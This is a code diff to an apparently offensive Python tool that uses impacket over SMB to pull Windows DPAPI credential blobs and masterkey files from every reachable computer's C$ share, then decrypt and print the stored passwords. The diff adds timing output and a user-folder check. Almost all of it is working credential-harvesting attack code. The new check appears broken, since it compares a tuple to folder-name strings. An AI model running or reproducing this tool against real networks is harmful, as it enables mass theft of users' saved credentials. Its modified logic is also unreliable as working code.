@@ -18,7 +18,7 @@
 #	C0wnuts (@kevin_racca)
 #
 
-import os, sys, argparse, random, string
+import os, sys, argparse, random, string, time
 from ldap3 import Connection, Server, NTLM, ALL
 from impacket.examples.utils import parse_target
 from impacket.smbconnection import SMBConnection
@@ -39,7 +39,7 @@ from impacket.ese import getUnixTime
 import hashlib
 
 sys.tracebacklimit = 0
-
+start = time.time()
 
 
 
@@ -268,59 +268,74 @@ def main():
 			if tid != 1:
 				sys.exit(1)
 
-			for current_user in users_list:
-				try:
-					if options.debugmax is True:
-						print("Trying user " + str(current_user[0]) + " on computer " + str(current_computer) )
-					response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\*")
-					is_there_any_blob_for_this_user = False
-					count_blobs = 0
-					count_mkf   = 0
-					for blob_file in response:
-						blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
-						if blob_file != "." and blob_file != "..":
-							# create and retrieve the credential blob
-							count_blobs     = count_blobs + 1
-							computer_folder = blobFolder + "/" + str(current_computer)
-							if not os.path.exists(computer_folder):
-								os.mkdir(computer_folder)
-							user_folder = computer_folder + "/" + str(current_user[0])
-							if not os.path.exists(user_folder):
-								os.mkdir(user_folder)
-							wf = open(user_folder + "/" + blob_file,'wb')
-							smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\" + blob_file, wf.write)
-							is_there_any_blob_for_this_user = True
-					response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\*")
 
-					for blob_file in response:
-						blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
-						if blob_file != "." and blob_file != "..":
-							# create and retrieve the credential blob
-							count_blobs     = count_blobs + 1
-							computer_folder = blobFolder + "/" + str(current_computer)
-							if not os.path.exists(computer_folder):
-								os.mkdir(computer_folder)
-							user_folder = computer_folder + "/" + str(current_user[0])
-							if not os.path.exists(user_folder):
-								os.mkdir(user_folder)
-							wf = open(user_folder + "/" + blob_file,'wb')
-							smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\" + blob_file, wf.write)
-							is_there_any_blob_for_this_user = True
-					if is_there_any_blob_for_this_user is True:
-						# If there is cred blob there is mkf so we have to get them too
-						response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\*")
-						for mkf in response:
-							mkf = str( str(mkf).split("longname=\"")[1] ).split("\", filesize=")[0]
-							if mkf != "." and mkf != ".." and mkf != "Preferred" and mkf[0:3] != "BK-":
-								count_mkf = count_mkf + 1
-								wf        = open(mkfFolder + "/" + mkf,'wb')
-								smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\" + mkf, wf.write)
-						print("\nNew credentials found for user " + str(current_user[0]) + " on " + str(current_computer) + " :")
-						print("Retrieved " + str(count_blobs) + " credential blob(s) and " + str(count_mkf) + " masterkey file(s)")	
-				except KeyboardInterrupt:
-					os._exit(1)
-				except:
-					pass # this user folder do not exist on this computer
+			# List Users folders for current computer
+			filesNfolders = smbClient.listPath("C$", "\\users\\*")
+			user_folder=''
+			users_folders = []
+			for item in filesNfolders:
+			    if item.is_directory():
+			        user_folder = str( str(item).split("longname=\"")[1] ).split("\", filesize=")[0]
+			        if user_folder != "." and user_folder != "..":
+			            users_folders.append(user_folder)
+
+
+            # For each user
+			for current_user in users_list:
+                # If there is a user folder for this user
+				if current_user in users_folders:
+					try:
+						if options.debugmax is True:
+							print("Trying user " + str(current_user[0]) + " on computer " + str(current_computer) )
+						response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\*")
+						is_there_any_blob_for_this_user = False
+						count_blobs = 0
+						count_mkf   = 0
+						for blob_file in response:
+							blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
+							if blob_file != "." and blob_file != "..":
+								# create and retrieve the credential blob
+								count_blobs     = count_blobs + 1
+								computer_folder = blobFolder + "/" + str(current_computer)
+								if not os.path.exists(computer_folder):
+									os.mkdir(computer_folder)
+								user_folder = computer_folder + "/" + str(current_user[0])
+								if not os.path.exists(user_folder):
+									os.mkdir(user_folder)
+								wf = open(user_folder + "/" + blob_file,'wb')
+								smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\" + blob_file, wf.write)
+								is_there_any_blob_for_this_user = True
+						response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\*")
+	
+						for blob_file in response:
+							blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
+							if blob_file != "." and blob_file != "..":
+								# create and retrieve the credential blob
+								count_blobs     = count_blobs + 1
+								computer_folder = blobFolder + "/" + str(current_computer)
+								if not os.path.exists(computer_folder):
+									os.mkdir(computer_folder)
+								user_folder = computer_folder + "/" + str(current_user[0])
+								if not os.path.exists(user_folder):
+									os.mkdir(user_folder)
+								wf = open(user_folder + "/" + blob_file,'wb')
+								smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\" + blob_file, wf.write)
+								is_there_any_blob_for_this_user = True
+						if is_there_any_blob_for_this_user is True:
+							# If there is cred blob there is mkf so we have to get them too
+							response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\*")
+							for mkf in response:
+								mkf = str( str(mkf).split("longname=\"")[1] ).split("\", filesize=")[0]
+								if mkf != "." and mkf != ".." and mkf != "Preferred" and mkf[0:3] != "BK-":
+									count_mkf = count_mkf + 1
+									wf        = open(mkfFolder + "/" + mkf,'wb')
+									smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\" + mkf, wf.write)
+							print("\nNew credentials found for user " + str(current_user[0]) + " on " + str(current_computer) + " :")
+							print("Retrieved " + str(count_blobs) + " credential blob(s) and " + str(count_mkf) + " masterkey file(s)")	
+					except KeyboardInterrupt:
+						os._exit(1)
+					except:
+						pass # this user folder do not exist on this computer
 		except KeyboardInterrupt:
 			os._exit(1)
 		except dns.exception.DNSException:
@@ -506,6 +521,10 @@ def main():
 		if len(array_of_credentials) > 0:
 			if options.debug is True:
 				print(str(len(array_of_credentials)) + " credentials have been decrypted !\n")
+				end = time.time()
+				elapsed = round(end - start)
+				print("Elapsed Time : " + str(elapsed) + " seconds\n")
+                
 			i = 0
 			if options.csv is True:
 				with open(directory + '/exported_credentials.csv', 'w', encoding='UTF8') as f:
@@ -532,6 +551,7 @@ def main():
 					else:
 						print("Password : " + str(credential['password2']))
 					print("***********************************************")
+            
 				
 				
 		else:
